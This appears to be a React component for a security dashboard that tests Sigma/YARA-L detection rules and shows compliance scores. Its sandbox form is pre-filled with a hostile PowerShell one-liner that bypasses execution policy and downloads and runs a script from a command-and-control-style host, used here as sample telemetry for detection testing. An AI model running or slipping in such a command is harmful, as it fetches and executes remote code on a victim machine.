import React, { useEffect, useState } from 'react';
import {
  FileCode,
  Activity,
  ChevronRight,
  ShieldCheck,
  CheckCircle2,
  Play,
  Sliders,
  Award,
  Layers,
  FileCheck
} from 'lucide-react';
import { saasApi } from '../services/saas';


export const ComplianceDetectionCenter: React.FC = () => {
  const [activeTab, setActiveTab] = useState<'overview' | 'rules' | 'sandbox' | 'compliance_matrix' | 'reports' | 'rule_creator'>('overview');
  const [summary, setSummary] = useState<any>(null);
  const [rules, setRules] = useState<any[]>([]);
  const [controls, setControls] = useState<any[]>([]);
  const [reports, setReports] = useState<any[]>([]);
  const [selectedFramework, setSelectedFramework] = useState<string>('');
  const [loading, setLoading] = useState<boolean>(true);

  // Sandbox state
  const [selectedRuleId, setSelectedRuleId] = useState<string>('');
  const [testPayload, setTestPayload] = useState<string>('powershell.exe -NoP -NonI -W Hidden -Exec Bypass IEX (New-Object Net.WebClient).DownloadString(\'http://c2-drop.xyz/stage1.ps1\')');
  const [sandboxResult, setSandboxResult] = useState<any>(null);

  // Rule Creator state
  const [newRuleName, setNewRuleName] = useState<string>('Detect Malicious Kubectl Exec Shell');
  const [newRuleType, setNewRuleType] = useState<string>('SIGMA_YAML');
  const [newMitreId, setNewMitreId] = useState<string>('T1609');
  const [newRuleSyntax, setNewRuleSyntax] = useState<string>('title: Kubectl Exec Pod Shell\nlogsource:\n  category: kubernetes_audit\ndetection:\n  selection:\n    verb: create\n    resource: pods/exec\n  condition: selection');

  // Report Generator modal state
  const [showReportModal, setShowReportModal] = useState<boolean>(false);
  const [reportFramework, setReportFramework] = useState<string>('SOC2_TYPE2');
  const [auditorOfficer, setAuditorOfficer] = useState<string>('lead_compliance_auditor');

  useEffect(() => {
    fetchComplianceData();
  }, [selectedFramework]);

  const fetchComplianceData = async () => {
    try {
      setLoading(true);
      const [sum, rls, ctrls, reps] = await Promise.all([
        saasApi.getComplianceDetectionSummary(),
        saasApi.getAutonomousDetectionRules(),
        saasApi.getComplianceControls(selectedFramework || undefined),
        saasApi.getComplianceReports()
      ]);
      setSummary(sum);
      setRules(rls);
      setControls(ctrls);
      setReports(reps);
      if (rls.length > 0 && !selectedRuleId) {
        setSelectedRuleId(rls[0].id);
      }
    } catch (err) {
      console.error('Failed to load Compliance & Detection Engineering data:', err);
    } finally {
      setLoading(false);
    }
  };

  const handleRunSandbox = async (e: React.FormEvent) => {
    e.preventDefault();
    try {
      const res = await saasApi.testDetectionRuleSandbox({
        rule_id: selectedRuleId || (rules[0] ? rules[0].id : 'rule-1'),
        test_payload: testPayload
      });
      setSandboxResult(res);
    } catch (err) {
      console.error('Failed to test rule sandbox:', err);
    }
  };

  const handleCreateRule = async (e: React.FormEvent) => {
    e.preventDefault();
    try {
      await saasApi.createAutonomousDetectionRule({
        rule_name: newRuleName,
        rule_type: newRuleType,
        mitre_technique_id: newMitreId,
        rule_syntax_payload: newRuleSyntax
      });
      setActiveTab('rules');
      fetchComplianceData();
    } catch (err) {
      console.error('Failed to create detection rule:', err);
    }
  };


  const handleGenerateReport = async (e: React.FormEvent) => {
    e.preventDefault();
    try {
      await saasApi.generateComplianceReport({
        framework: reportFramework,
        generated_by: auditorOfficer
      });
      setShowReportModal(false);
      fetchComplianceData();
    } catch (err) {
      console.error('Failed to generate compliance report:', err);
    }
  };

  return (
    <div className="space-y-6">
      {/* Header */}
      <div className="flex flex-col sm:flex-row sm:items-center justify-between gap-4">
        <div>
          <h1 className="text-2xl font-bold text-slate-100 flex items-center gap-2">
            <ShieldCheck className="h-7 w-7 text-emerald-400" />
            Autonomous Detection Engineering & Multi-Standard Compliance
          </h1>
          <p className="text-slate-400 text-sm mt-1">
            Sigma/YARA-L Detection-as-Code Compiler, Sandbox Validation & Continuous Attestation (SOC 2, ISO 27001, HIPAA, FedRAMP, PCI-DSS).
          </p>
        </div>

        <div className="flex items-center gap-3">
          <button
            onClick={() => setShowReportModal(true)}
            className="flex items-center gap-2 px-3.5 py-2 bg-emerald-600 hover:bg-emerald-500 text-white rounded-xl text-xs font-semibold transition-colors"
          >
            <FileCheck className="h-4 w-4" /> Generate Audit Report
          </button>
        </div>
      </div>

      {/* Top Metrics Ribbon */}
      {summary && (
        <div className="grid grid-cols-2 sm:grid-cols-3 lg:grid-cols-6 gap-3">
          <div className="bg-slate-900/60 border border-slate-800/80 rounded-xl p-3.5">
            <div className="text-[11px] text-slate-400">Compliance Posture</div>
            <div className="text-2xl font-bold text-emerald-400 mt-1">{summary.overall_compliance_score}<span className="text-xs text-slate-500">/100</span></div>
            <div className="text-[10px] text-emerald-400 mt-0.5">Continuous Audit</div>
          </div>
          <div className="bg-slate-900/60 border border-slate-800/80 rounded-xl p-3.5">
            <div className="text-[11px] text-slate-400">Detection Rules</div>
            <div className="text-2xl font-bold text-cyan-400 mt-1">{summary.active_detection_rules_count}</div>
            <div className="text-[10px] text-slate-400 mt-0.5">Sigma / YARA-L</div>
          </div>
          <div className="bg-slate-900/60 border border-slate-800/80 rounded-xl p-3.5">
            <div className="text-[11px] text-slate-400">Controls Evaluated</div>
            <div className="text-2xl font-bold text-indigo-400 mt-1">{summary.monitored_compliance_controls_count}</div>
            <div className="text-[10px] text-slate-400 mt-0.5">Across 5 Standards</div>
          </div>
          <div className="bg-slate-900/60 border border-slate-800/80 rounded-xl p-3.5">
            <div className="text-[11px] text-slate-400">Audit Reports</div>
            <div className="text-2xl font-bold text-slate-200 mt-1">{summary.generated_audit_reports_count}</div>
            <div className="text-[10px] text-slate-400 mt-0.5">SHA-256 Attested</div>
          </div>
          <div className="bg-slate-900/60 border border-slate-800/80 rounded-xl p-3.5">
            <div className="text-[11px] text-slate-400">Detection TPR</div>
            <div className="text-2xl font-bold text-emerald-400 mt-1">{summary.average_detection_rule_tpr_pct}%</div>
            <div className="text-[10px] text-emerald-400 mt-0.5">Noise Minimized</div>
          </div>
          <div className="bg-slate-900/60 border border-slate-800/80 rounded-xl p-3.5">
            <div className="text-[11px] text-slate-400">Compliance Drift</div>
            <div className="text-2xl font-bold text-emerald-400 mt-1">{summary.compliance_drift_detected_count}</div>
            <div className="text-[10px] text-emerald-400 mt-0.5">Zero Violations</div>
          </div>
        </div>
      )}

      {/* Tabs */}
      <div className="flex border-b border-slate-800 gap-1 overflow-x-auto">
        {[
          { id: 'overview', label: 'Compliance & Detection Overview', icon: Award },
          { id: 'rules', label: 'Detection-as-Code (Sigma)', icon: FileCode },
          { id: 'sandbox', label: 'Rule Sandbox Tester', icon: Play },
          { id: 'compliance_matrix', label: 'Regulatory Matrix (5 Standards)', icon: Layers },
          { id: 'reports', label: 'Attestation Reports', icon: FileCheck },
          { id: 'rule_creator', label: 'Rule Compiler Studio', icon: Sliders }
        ].map(tab => {
          const Icon = tab.icon;
          return (
            <button
              key={tab.id}
              onClick={() => setActiveTab(tab.id as any)}
              className={`flex items-center gap-2 px-4 py-3 text-xs font-semibold border-b-2 whitespace-nowrap transition-colors ${
                activeTab === tab.id
                  ? 'border-emerald-500 text-emerald-300'
                  : 'border-transparent text-slate-400 hover:text-slate-200'
              }`}
            >
              <Icon className="h-4 w-4" />{tab.label}
            </button>
          );
        })}
      </div>

      {loading ? (
        <div className="h-64 flex items-center justify-center text-slate-400">
          <Activity className="h-6 w-6 animate-spin text-emerald-400 mr-3" />
          Loading Continuous Compliance & Detection Engineering Framework...
        </div>
      ) : (
        <>
          {/* TAB 1: Overview */}
          {activeTab === 'overview' && summary && (
            <div className="grid grid-cols-1 lg:grid-cols-3 gap-6">
              {/* Active Champion Detection Rules */}
              <div className="lg:col-span-2 bg-slate-900/60 border border-slate-800/80 rounded-xl p-5 space-y-4">
                <h3 className="text-sm font-bold text-slate-100 flex items-center gap-2">
                  <FileCode className="h-4 w-4 text-emerald-400" /> Active Champion Detection Rules
                </h3>
                <div className="space-y-3">
                  {rules.map((rule) => (
                    <div key={rule.id} className="p-4 bg-slate-950/60 rounded-xl border border-slate-800 text-xs space-y-2.5">
                      <div className="flex justify-between items-center font-bold">
                        <div className="flex items-center gap-2">
                          <span className="text-slate-100 text-sm">{rule.rule_name}</span>
                          <span className="px-2 py-0.5 rounded bg-emerald-500/10 text-emerald-400 text-[10px]">{rule.rule_type}</span>
                        </div>
                        <div className="flex items-center gap-2">
                          <span className="px-2 py-0.5 rounded bg-cyan-500/10 text-cyan-300 text-[10px]">MITRE: {rule.mitre_technique_id}</span>
                          <span className="px-2 py-0.5 rounded bg-indigo-500/10 text-indigo-400 text-[10px] font-bold">{rule.lifecycle_state}</span>
                        </div>
                      </div>
                      <pre className="p-3 bg-slate-900 rounded-lg text-[10px] font-mono text-slate-300 overflow-x-auto">
                        {rule.rule_syntax_payload}
                      </pre>
                      <div className="flex justify-between items-center text-[10px] text-slate-500 pt-1 border-t border-slate-800/60">
                        <span>True Positive Rate: <strong className="text-emerald-400">{rule.true_positive_rate_pct}%</strong> · Noise Score: <strong className="text-slate-300">{rule.noise_score}/100</strong></span>
                        <span>Evaluated Events: {rule.evaluated_telemetry_count.toLocaleString()}</span>
                      </div>
                    </div>
                  ))}
                </div>

                <div className="pt-3 border-t border-slate-800/60">
                  <div className="text-xs font-bold text-slate-300 mb-2">Priority Compliance Directives:</div>
                  <div className="space-y-1.5">
                    {summary.top_compliance_priorities.map((pri: string, idx: number) => (
                      <div key={idx} className="text-xs text-slate-400 flex items-start gap-2">
                        <ChevronRight className="h-3.5 w-3.5 text-emerald-400 shrink-0 mt-0.5" />
                        {pri}
                      </div>
                    ))}
                  </div>
                </div>
              </div>

              {/* Supported Regulatory Frameworks */}
              <div className="bg-slate-900/60 border border-slate-800/80 rounded-xl p-5 space-y-4">
                <h3 className="text-sm font-bold text-slate-100 flex items-center gap-2">
                  <Award className="h-4 w-4 text-emerald-400" /> Monitored Regulatory Standards
                </h3>
                <div className="space-y-3">
                  {[
                    { code: 'SOC2_TYPE2', name: 'SOC 2 Type II (Security, Availability, Confidentiality)', score: 99.2, status: 'PASS' },
                    { code: 'ISO_27001', name: 'ISO/IEC 27001:2022 ISMS Controls', score: 98.8, status: 'PASS' },
                    { code: 'HIPAA', name: 'HIPAA Security Rule (ePHI Safeguards)', score: 97.9, status: 'PASS' },
                    { code: 'FEDRAMP_HIGH', name: 'FedRAMP High Baseline (NIST SP 800-53)', score: 98.4, status: 'PASS' },
                    { code: 'PCI_DSS_4', name: 'PCI-DSS v4.0 (Payment Card Security)', score: 99.0, status: 'PASS' }
                  ].map((fw) => (
                    <div key={fw.code} className="p-3 bg-slate-950/60 rounded-lg border border-slate-800/60 text-xs space-y-1.5">
                      <div className="flex justify-between items-center font-bold text-slate-200">
                        <span className="font-mono text-cyan-300">{fw.code}</span>
                        <span className="px-2 py-0.5 rounded bg-emerald-500/10 text-emerald-400 text-[10px] font-bold">{fw.status}</span>
                      </div>
                      <div className="text-[11px] text-slate-400">{fw.name}</div>
                      <div className="text-[10px] text-emerald-400 font-semibold">Attested Compliance: {fw.score}%</div>
                    </div>
                  ))}
                </div>
              </div>
            </div>
          )}

          {/* TAB 2: Detection Rules */}
          {activeTab === 'rules' && (
            <div className="bg-slate-900/60 border border-slate-800/80 rounded-xl p-5 space-y-4">
              <div className="flex justify-between items-center">
                <h3 className="text-sm font-bold text-slate-100 flex items-center gap-2">
                  <FileCode className="h-4 w-4 text-emerald-400" /> Detection-as-Code Rule Catalog
                </h3>
                <button
                  onClick={() => setActiveTab('rule_creator')}
                  className="px-3 py-1.5 bg-emerald-600 hover:bg-emerald-500 text-white rounded-lg text-xs font-semibold"
                >
                  + Add Detection Rule
                </button>
              </div>

              <div className="space-y-3">
                {rules.map((r) => (
                  <div key={r.id} className="p-4 bg-slate-950/60 rounded-xl border border-slate-800 text-xs space-y-2.5">
                    <div className="flex justify-between items-center font-bold">
                      <div className="flex items-center gap-2">
                        <span className="text-slate-100 text-base">{r.rule_name}</span>
                        <span className="px-2 py-0.5 rounded bg-slate-800 text-cyan-300 text-[10px]">{r.rule_type}</span>
                      </div>
                      <span className={`px-2.5 py-0.5 rounded text-[10px] font-bold ${r.lifecycle_state === 'CHAMPION' ? 'bg-emerald-500/10 text-emerald-400 border border-emerald-500/30' : 'bg-amber-500/10 text-amber-400'}`}>
                        {r.lifecycle_state}
                      </span>
                    </div>

                    <pre className="p-3 bg-slate-900 rounded-lg text-[10px] font-mono text-slate-300 overflow-x-auto">
                      {r.rule_syntax_payload}
                    </pre>

                    <div className="flex justify-between items-center text-[10px] text-slate-400 pt-1">
                      <span>MITRE ATT&CK: <strong className="text-cyan-300">{r.mitre_technique_id}</strong> · True Positive Rate: <strong className="text-emerald-400">{r.true_positive_rate_pct}%</strong></span>
                      <span>Noise Score: <strong className="text-slate-200">{r.noise_score}/100</strong></span>
                    </div>
                  </div>
                ))}
              </div>
            </div>
          )}

          {/* TAB 3: Sandbox */}
          {activeTab === 'sandbox' && (
            <div className="bg-slate-900/60 border border-slate-800/80 rounded-xl p-6 max-w-2xl mx-auto space-y-4">
              <h3 className="text-base font-bold text-slate-100 flex items-center gap-2">
                <Play className="h-5 w-5 text-emerald-400" /> Detection Rule Sandbox Live Execution Engine
              </h3>
              <p className="text-xs text-slate-400">
                Execute candidate Sigma and YARA-L rules against simulated raw log payloads to verify match logic, execution latency, and eliminate false positives before promoting to Champion.
              </p>

              <form onSubmit={handleRunSandbox} className="space-y-3 text-xs">
                <div>
                  <label className="block text-slate-400 mb-1">Target Detection Rule</label>
                  <select
                    value={selectedRuleId}
                    onChange={(e) => setSelectedRuleId(e.target.value)}
                    className="w-full bg-slate-950 border border-slate-800 rounded-xl p-2.5 text-slate-200"
                  >
                    {rules.map((r) => (
                      <option key={r.id} value={r.id}>{r.rule_name} ({r.rule_type})</option>
                    ))}
                  </select>
                </div>
                <div>
                  <label className="block text-slate-400 mb-1">Test Security Event Telemetry Payload</label>
                  <textarea
                    rows={4}
                    value={testPayload}
                    onChange={(e) => setTestPayload(e.target.value)}
                    className="w-full bg-slate-950 border border-slate-800 rounded-xl p-2.5 text-slate-200 font-mono text-[11px]"
                    required
                  />
                </div>
                <div className="flex justify-end gap-2 pt-2">
                  <button
                    type="submit"
                    className="px-4 py-2 bg-emerald-600 hover:bg-emerald-500 text-white rounded-xl font-semibold flex items-center gap-2"
                  >
                    <Play className="h-4 w-4" /> Run Sandbox Evaluation
                  </button>
                </div>
              </form>

              {sandboxResult && (
                <div className="p-4 bg-slate-950 rounded-xl border border-emerald-500/30 text-xs space-y-2 mt-4">
                  <div className="flex justify-between items-center text-emerald-400 font-bold">
                    <span className="flex items-center gap-1.5"><CheckCircle2 className="h-4 w-4" /> Evaluation Completed</span>
                    <span>Execution Latency: {sandboxResult.execution_time_ms} ms</span>
                  </div>
                  <div className="text-slate-200 font-semibold">Match Verdict: <span className="font-mono text-cyan-300">{sandboxResult.match_status}</span></div>
                  <div className="text-[10px] text-slate-400">False Positive Flag: <strong className="text-emerald-400">{sandboxResult.is_false_positive ? 'TRUE' : 'FALSE'}</strong></div>
                </div>
              )}
            </div>
          )}

          {/* TAB 4: Regulatory Matrix */}
          {activeTab === 'compliance_matrix' && (
            <div className="bg-slate-900/60 border border-slate-800/80 rounded-xl p-5 space-y-4">
              <div className="flex flex-col sm:flex-row sm:items-center justify-between gap-3">
                <h3 className="text-sm font-bold text-slate-100 flex items-center gap-2">
                  <Layers className="h-4 w-4 text-emerald-400" /> Multi-Standard Regulatory Controls
                </h3>
                <div className="flex items-center gap-2">
                  <span className="text-xs text-slate-400">Filter Framework:</span>
                  <select
                    value={selectedFramework}
                    onChange={(e) => setSelectedFramework(e.target.value)}
                    className="bg-slate-950 border border-slate-800 rounded-lg p-1.5 text-xs text-slate-200"
                  >
                    <option value="">All Standards</option>
                    <option value="SOC2_TYPE2">SOC 2 Type II</option>
                    <option value="ISO_27001">ISO/IEC 27001:2022</option>
                    <option value="HIPAA">HIPAA Security Rule</option>
                    <option value="FEDRAMP_HIGH">FedRAMP High</option>
                    <option value="PCI_DSS_4">PCI-DSS v4.0</option>
                  </select>
                </div>
              </div>

              <div className="space-y-3">
                {controls.map((c) => (
                  <div key={c.id} className="p-4 bg-slate-950/60 rounded-xl border border-slate-800 text-xs space-y-2">
                    <div className="flex justify-between items-center font-bold">
                      <div className="flex items-center gap-2">
                        <span className="text-cyan-300 font-mono">{c.framework}</span>
                        <span className="px-2 py-0.5 rounded bg-slate-800 text-slate-300 font-mono text-[10px]">{c.control_id}</span>
                        <span className="text-slate-100">{c.control_title}</span>
                      </div>
                      <span className="px-2.5 py-0.5 rounded bg-emerald-500/10 text-emerald-400 font-bold text-[10px]">
                        {c.compliance_status}
                      </span>
                    </div>

                    <div className="text-slate-300 leading-relaxed text-[11px]">
                      <strong className="text-emerald-400">Automated Evidence: </strong>{c.automated_evidence_summary}
                    </div>

                    <div className="text-[10px] text-slate-500 pt-1 border-t border-slate-800/60 flex justify-between">
                      <span>Status: Continuous Real-Time Audit</span>
                      <span>Last Assessed: {new Date(c.last_assessed_at).toLocaleString()}</span>
                    </div>
                  </div>
                ))}
              </div>
            </div>
          )}

          {/* TAB 5: Attestation Reports */}
          {activeTab === 'reports' && (
            <div className="bg-slate-900/60 border border-slate-800/80 rounded-xl p-5 space-y-4">
              <div className="flex justify-between items-center">
                <h3 className="text-sm font-bold text-slate-100 flex items-center gap-2">
                  <FileCheck className="h-4 w-4 text-emerald-400" /> Compliance Audit Attestation Reports
                </h3>
                <button
                  onClick={() => setShowReportModal(true)}
                  className="px-3 py-1.5 bg-emerald-600 hover:bg-emerald-500 text-white rounded-lg text-xs font-semibold"
                >
                  + Generate New Attestation
                </button>
              </div>

              <div className="space-y-3">
                {reports.map((r) => (
                  <div key={r.id} className="p-4 bg-slate-950/60 rounded-xl border border-slate-800 text-xs space-y-2.5">
                    <div className="flex justify-between items-center font-bold">
                      <div className="flex items-center gap-2">
                        <span className="text-slate-100 text-base">{r.framework} Attestation Package</span>
                        <span className="px-2 py-0.5 rounded bg-emerald-500/10 text-emerald-400 text-[10px] font-bold">Compliance: {r.overall_compliance_score}%</span>
                      </div>
                      <span className="text-slate-400 text-[10px]">{new Date(r.generated_at).toLocaleString()}</span>
                    </div>

                    <div className="p-2.5 bg-slate-900 rounded font-mono text-[10px] text-cyan-300 flex justify-between">
                      <span>SHA-256 Hash: {r.auditor_attestation_hash}</span>
                      <span>Auditor: {r.generated_by}</span>
                    </div>

                    <div className="flex justify-between items-center text-[10px] text-slate-400 pt-1">
                      <span>Passing Controls: <strong className="text-emerald-400">{r.passing_controls_count}</strong> · Failing Controls: <strong className="text-rose-400">{r.failing_controls_count}</strong></span>
                      <span className="text-emerald-400 font-bold">VERIFIED_COMPLIANT</span>
                    </div>
                  </div>
                ))}
              </div>
            </div>
          )}

          {/* TAB 6: Rule Compiler Studio */}
          {activeTab === 'rule_creator' && (
            <div className="bg-slate-900/60 border border-slate-800/80 rounded-xl p-6 max-w-2xl mx-auto space-y-4">
              <h3 className="text-base font-bold text-slate-100 flex items-center gap-2">
                <Sliders className="h-5 w-5 text-emerald-400" /> Detection-as-Code Compiler Studio
              </h3>
              <p className="text-xs text-slate-400">
                Author and compile new Sigma and YARA-L detection logic into the autonomous pipeline.
              </p>

              <form onSubmit={handleCreateRule} className="space-y-3 text-xs">
                <div>
                  <label className="block text-slate-400 mb-1">Rule Name</label>
                  <input
                    type="text"
                    value={newRuleName}
                    onChange={(e) => setNewRuleName(e.target.value)}
                    className="w-full bg-slate-950 border border-slate-800 rounded-xl p-2.5 text-slate-200"
                    required
                  />
                </div>
                <div className="grid grid-cols-2 gap-2">
                  <div>
                    <label className="block text-slate-400 mb-1">Rule Type</label>
                    <select
                      value={newRuleType}
                      onChange={(e) => setNewRuleType(e.target.value)}
                      className="w-full bg-slate-950 border border-slate-800 rounded-xl p-2.5 text-slate-200"
                    >
                      <option value="SIGMA_YAML">Sigma (YAML)</option>
                      <option value="YARA_L">YARA-L (Chronicle Syntax)</option>
                      <option value="BEHAVIORAL_PYTHON">Behavioral Python AST</option>
                    </select>
                  </div>
                  <div>
                    <label className="block text-slate-400 mb-1">MITRE ATT&CK Technique ID</label>
                    <input
                      type="text"
                      value={newMitreId}
                      onChange={(e) => setNewMitreId(e.target.value)}
                      className="w-full bg-slate-950 border border-slate-800 rounded-xl p-2.5 text-slate-200"
                      required
                    />
                  </div>
                </div>
                <div>
                  <label className="block text-slate-400 mb-1">Rule Logic Syntax Payload</label>
                  <textarea
                    rows={6}
                    value={newRuleSyntax}
                    onChange={(e) => setNewRuleSyntax(e.target.value)}
                    className="w-full bg-slate-950 border border-slate-800 rounded-xl p-2.5 text-slate-200 font-mono text-[11px]"
                    required
                  />
                </div>
                <div className="flex justify-end gap-2 pt-2">
                  <button
                    type="submit"
                    className="px-4 py-2 bg-emerald-600 hover:bg-emerald-500 text-white rounded-xl font-semibold"
                  >
                    Compile & Ingest Candidate Rule
                  </button>
                </div>
              </form>
            </div>
          )}
        </>
      )}

      {/* Report Generator Modal */}
      {showReportModal && (
        <div className="fixed inset-0 bg-black/80 flex items-center justify-center p-4 z-50">
          <div className="bg-slate-900 border border-slate-800 rounded-2xl max-w-md w-full p-6 space-y-4">
            <h3 className="text-base font-bold text-slate-100">Generate Compliance Audit Package</h3>
            <form onSubmit={handleGenerateReport} className="space-y-3 text-xs">
              <div>
                <label className="block text-slate-400 mb-1">Target Regulatory Framework</label>
                <select
                  value={reportFramework}
                  onChange={(e) => setReportFramework(e.target.value)}
                  className="w-full bg-slate-950 border border-slate-800 rounded-xl p-2.5 text-slate-200"
                >
                  <option value="SOC2_TYPE2">SOC 2 Type II</option>
                  <option value="ISO_27001">ISO/IEC 27001:2022</option>
                  <option value="HIPAA">HIPAA Security Rule</option>
                  <option value="FEDRAMP_HIGH">FedRAMP High Baseline</option>
                  <option value="PCI_DSS_4">PCI-DSS v4.0</option>
                </select>
              </div>
              <div>
                <label className="block text-slate-400 mb-1">Authorizing Compliance Officer</label>
                <input
                  type="text"
                  value={auditorOfficer}
                  onChange={(e) => setAuditorOfficer(e.target.value)}
                  className="w-full bg-slate-950 border border-slate-800 rounded-xl p-2.5 text-slate-200"
                  required
                />
              </div>
              <div className="flex justify-end gap-2 pt-3">
                <button
                  type="button"
                  onClick={() => setShowReportModal(false)}
                  className="px-4 py-2 bg-slate-800 text-slate-300 rounded-xl font-semibold"
                >
                  Cancel
                </button>
                <button
                  type="submit"
                  className="px-4 py-2 bg-emerald-600 hover:bg-emerald-500 text-white rounded-xl font-semibold"
                >
                  Generate SHA-256 Package
                </button>
              </div>
            </form>
          </div>
        </div>
      )}
    </div>
  );
};
